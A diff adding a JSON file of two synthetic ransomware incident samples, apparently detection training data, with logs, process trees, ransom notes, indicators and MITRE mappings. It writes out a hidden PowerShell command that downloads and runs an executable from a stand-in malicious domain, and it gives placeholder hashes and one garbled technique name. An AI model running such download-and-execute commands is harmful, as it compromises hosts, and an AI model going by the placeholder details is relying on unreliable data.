@@ -1,0 +1,133 @@
+{
+  "samples": [
+    {
+      "scenario": "An enterprise ransomware infection where threat actors use a multi-stage attack: initial access via phishing, lateral movement with stolen credentials, exfiltration of sensitive documents using a custom encrypted tunnel over TCP port 8443, followed by mass encryption of endpoint files and deployment of ransom notes demanding payment in cryptocurrency.",
+      "technical_data": {
+        "network_packet_capture_excerpt": "Frame 2048: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 2\nEthernet II, Src: 00:0c:29:8d:7a:bc, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 10.20.30.45, Dst: 203.0.113.55\nTransmission Control Protocol, Src Port: 49210, Dst Port: 8443, Seq: 34567, Ack: 12345\nData: [Encrypted payload data stream establishing custom tunnel]",
+        "http_request_raw": "N/A (custom encrypted TCP tunnel over port 8443)",
+        "ransom_note_file": "-----BEGIN RANSOM NOTE-----\nYour critical files have been encrypted.\nTo get your decryption key, visit: hxxp://securepay.darknet/payment\nReference ID: 93F7D28E-4B1C-4F9A-9D24-7A1C1234E567\nFailure to pay within 48 hours will result in data release to competitors.\n-----END RANSOM NOTE-----",
+        "windows_event_log_rundll32": "Date: 2024-06-01 22:15:10\nSource: Microsoft-Windows-Sysmon\nEventID: 1\nImage: C:\\Windows\\System32\\rundll32.exe\nCommandLine: rundll32.exe C:\\Users\\User\\AppData\\Local\\Temp\\stage2.dll,RunPayload\nParentImage: C:\\Windows\\explorer.exe\nUser: COMPANY\\User",
+        "file_system_changes": [
+          "D:\\Projects\\ConfidentialProposal.docx.encrypted (new encrypted file)",
+          "D:\\Projects\\ConfidentialProposal.docx (original deleted)",
+          "C:\\Users\\Public\\_HELP_RECOVER_FILES.txt (ransom note)"
+        ],
+        "process_tree": [
+          "explorer.exe (PID: 5012)",
+          "  \u2514\u2500 cmd.exe /c powershell -nop -w hidden -c Invoke-WebRequest -Uri hxxps://downloads.evilsite.net/stage1.exe -OutFile C:\\Users\\User\\AppData\\Local\\Temp\\stage1.exe (PID: 6524)",
+          "    \u2514\u2500 C:\\Users\\User\\AppData\\Local\\Temp\\stage1.exe (PID: 6530)",
+          "      \u2514\u2500 rundll32.exe C:\\Users\\User\\AppData\\Local\\Temp\\stage2.dll,RunPayload (PID: 6540)"
+        ],
+        "registry_modifications": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - Name: \"UpdateService\" - Data: \"C:\\Users\\User\\AppData\\Local\\Temp\\stage2.dll\""
+        ],
+        "dns_logs": [
+          "2024-06-01T22:10:45Z QUERY downloads.evilsite.net A",
+          "2024-06-01T22:10:45Z RESPONSE 203.0.113.55"
+        ],
+        "powershell_command_logged": "Invoke-WebRequest -Uri hxxps://downloads.evilsite.net/stage1.exe -OutFile C:\\Users\\User\\AppData\\Local\\Temp\\stage1.exe",
+        "file_hashes": {
+          "stage2.dll": {
+            "MD5": "b3f5a1d97c4e0e5b9a2c3d4e5f67890a",
+            "SHA1": "7a4e2b8d3e9c1f5a6b7c8d9e0f1a2b3c4d5e6f7a",
+            "SHA256": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0"
+          }
+        }
+      },
+      "indicators": {
+        "domains": [
+          "downloads.evilsite.net"
+        ],
+        "ip_addresses": [
+          "203.0.113.55"
+        ],
+        "file_hashes": [
+          "b3f5a1d97c4e0e5b9a2c3d4e5f67890a",
+          "7a4e2b8d3e9c1f5a6b7c8d9e0f1a2b3c4d5e6f7a",
+          "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService"
+        ],
+        "processes": [
+          "rundll32.exe",
+          "powershell.exe",
+          "stage1.exe"
+        ]
+      },
+      "detection_method": "Endpoint detection identifies suspicious PowerShell commands downloading executables from unknown domains. Network monitoring detects encrypted tunnels over non-standard port 8443 to external IPs. File integrity monitoring alerts on bulk creation of .encrypted files and ransom note text files. Registry monitoring logs new persistence keys under current user run keys. Correlation between these events triggers ransomware detection workflow focused on data exfiltration and encryption.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1573.001 - Encrypted Channel",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1112 - Modify Registry",
+        "T1560.002 - Archive via Archive via Encrypted Channel"
+      ]
+    },
+    {
+      "scenario": "Ransomware targeting an enterprise backup server where attackers use a scheduled task to launch a malicious PowerShell script that exfiltrates backups over FTP to an external server before encrypting backup files and leaving ransom notes on the system.",
+      "technical_data": {
+        "network_packet_capture_excerpt": "Frame 3072: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 1\nEthernet II, Src: 00:15:5d:01:23:45, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 172.16.40.12, Dst: 198.51.100.77\nTransmission Control Protocol, Src Port: 54321, Dst Port: 21, Seq: 7890, Ack: 4567\nFile Transfer Protocol\n    Command: STOR backups_20240605.zip.enc",
+        "http_request_raw": "N/A (FTP protocol used for exfiltration)",
+        "ransom_note_file": "-----BEGIN RANSOM NOTE-----\nYour backup files are encrypted.\nPay the ransom at hxxp://payme.darkweb/pay\nID: 5D9A7E4C-82B1-47AF-9C32-0987654321AB\nIf unpaid in 72 hours, your backups will be leaked publicly.\n-----END RANSOM NOTE-----",
+        "windows_event_log_rundll32": "Date: 2024-06-05 01:12:48\nSource: Microsoft-Windows-Sysmon\nEventID: 1\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_exfil_encrypt.ps1\nParentImage: C:\\Windows\\System32\\svchost.exe\nUser: BACKUP\\Administrator",
+        "file_system_changes": [
+          "E:\\Backups\\FullBackup_20240605.zip.encrypted (new encrypted file)",
+          "E:\\Backups\\FullBackup_20240605.zip (original deleted)",
+          "C:\\Users\\Public\\RECOVER_BACKUPS.txt (ransom note)"
+        ],
+        "process_tree": [
+          "svchost.exe (PID: 3004)",
+          "  \u2514\u2500 powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_exfil_encrypt.ps1 (PID: 4560)"
+        ],
+        "registry_modifications": [
+          "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks - TaskName: \"BackupTask\" - Action: powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_exfil_encrypt.ps1"
+        ],
+        "dns_logs": [
+          "2024-06-05T01:10:30Z QUERY ftp.exfil-server.com A",
+          "2024-06-05T01:10:30Z RESPONSE 198.51.100.77"
+        ],
+        "powershell_command_logged": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup_exfil_encrypt.ps1",
+        "file_hashes": {
+          "backup_exfil_encrypt.ps1": {
+            "MD5": "d41d8cd98f00b204e9800998ecf8427e",
+            "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        }
+      },
+      "indicators": {
+        "domains": [
+          "ftp.exfil-server.com"
+        ],
+        "ip_addresses": [
+          "198.51.100.77"
+        ],
+        "file_hashes": [
+          "d41d8cd98f00b204e9800998ecf8427e",
+          "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+          "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        ],
+        "registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\BackupTask"
+        ],
+        "processes": [
+          "powershell.exe",
+          "svchost.exe"
+        ]
+      },
+      "detection_method": "Scheduled task monitoring detects new or modified tasks executing PowerShell scripts with bypassed execution policies. Network monitoring identifies FTP connections transferring large encrypted backup files to suspicious external IPs. File integrity monitoring raises alerts on mass encryption of backup archives and ransom note deployments. Registry monitoring tracks suspicious scheduled task creation or modification. Correlation of these events supports detection of ransomware with exfiltration on backup servers.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1059.001 - PowerShell",
+        "T1053.005 - Scheduled Task",
+        "T1105 - Ingress Tool Transfer",
+        "T1112 - Modify Registry",
+        "T1560.001 - Archive Collected Data"
+      ]
+    }
+  ]
+}
